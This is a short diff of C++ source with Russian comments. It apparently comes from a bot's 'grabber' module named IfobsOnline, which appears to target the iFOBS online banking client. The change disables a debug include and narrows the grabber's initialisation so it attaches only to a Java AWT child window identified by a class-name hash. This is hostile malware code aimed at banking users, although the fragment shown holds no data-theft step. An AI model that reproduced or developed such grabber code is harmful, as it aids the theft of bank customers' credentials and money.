@@ -19,7 +19,7 @@
 //---------------------------------------------------------------------------
 
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
 namespace IFOBSONLINEEBUGSTRINGS
 {
@@ -112,10 +112,10 @@ namespace IfobsOnline
 	//*****************************************************
 	//  Initialize - Функия инициализирует грабер
 	//*****************************************************
-	bool Initialize(HWND JafaFrameWnd, const char* URL, bool IsChildWnd)
+	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd)
 	{
 		// проверяем текущий процесс
-		if (!IsChildWnd) return false;
+		if (ClassWndHash != JAVAWND_SUNAWTFRAME || !IsChildWnd) return false;
 
 		if (IsNewProcess(PID))
 		{
